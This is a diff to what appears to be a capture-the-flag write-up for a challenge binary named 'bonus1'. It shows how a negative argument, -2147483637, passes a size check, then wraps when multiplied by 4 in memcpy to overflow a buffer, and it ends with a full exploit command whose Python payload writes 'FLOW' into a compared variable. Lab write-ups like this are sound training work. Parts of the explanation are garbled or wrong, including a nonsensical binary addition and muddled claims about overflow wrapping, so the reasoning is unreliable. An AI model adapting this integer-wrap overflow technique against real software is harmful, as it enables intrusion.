@@ -17,8 +17,27 @@ First argument here is size which multiply to 4.
 Than to put length more than < 10, we could use
 numbers with minus.
 When negative number multiply to 4, it will be positive
-because size_t is unsigned integer type 
+because size_t is unsigned integer type.
+When unsigned integer type has overflow, values is changing by 0.
 https://stackoverflow.com/questions/2550774/what-is-size-t-in-c
+For example:
+int main()
+{
+    printf("%d ", INT_MIN * 4);
+
+    return 0;
+}
+> 0
+Because its calculating like
+    11111101
+    10101110
+   111111111 <-- overflow.
+Therefore PC will read it incorrect because remember just first 8 cells.
+So if we find number which multiply with 4 will be more than size of buff, it will
+overflow buff and let us to set new value to variable var.
+
+Result depends of even (2, 4, 6, 8) and odd numbers (3, 5, 7, 1).
+
 And if we find negative number which have size 11
 we could to overflow the buffer by 4 bytes
 and it will let us write own number to comparation.
@@ -27,29 +46,27 @@ How to find right negative number, than to find
 11, because it will multiply to 4 = 44 and it will
 be overflow?
 
-We decide to find number via:
-"printf("%u\n", (size_t)(atoi(((INT_MIN + 1)* 4)):
-will print: 4
-+ 2 = 4
-+ 3 = 12
-...
-+ 11 = 44
--2 147 483 648 - 11 = -2147483637
-"printf("%u\n", (size_t)(atoi((INT_MIN * 4)):
+int main()
+{
+    printf("%d ", (INT_MIN + 11) * 4);
+
+    return 0;
+}
+
+We have calculated till 11 number than to find result 44.
 
 Therefore look at this steps:
 1. We put first argument -2147483637 because:
 a) it's less than 10
-b) memcpy take size of this number and multiply
-to 4 and buffer will be 44, it's overflow of 4 bytes.
+b) memcpy take result of multiply this number to 4 and overflow buffer with 44 cells.
 
-2. second argument will be python script
+2. second argument will be python script command
 which fill with litterals all cells
 $(python -c "print 'x'*40)
 
 3. + 1464814662 <-- plus number of comparation
 like hex '\x46\x4c\x4f\x57' to record this number
-to variable iStack20 to compare.
+to variable iStack20 to compare - will fill last 4 bytes.
 
 in conclude:
 ./bonus1 -2147483637 $(python -c "print 'x'*40 + '\x46\x4c\x4f\x57'")
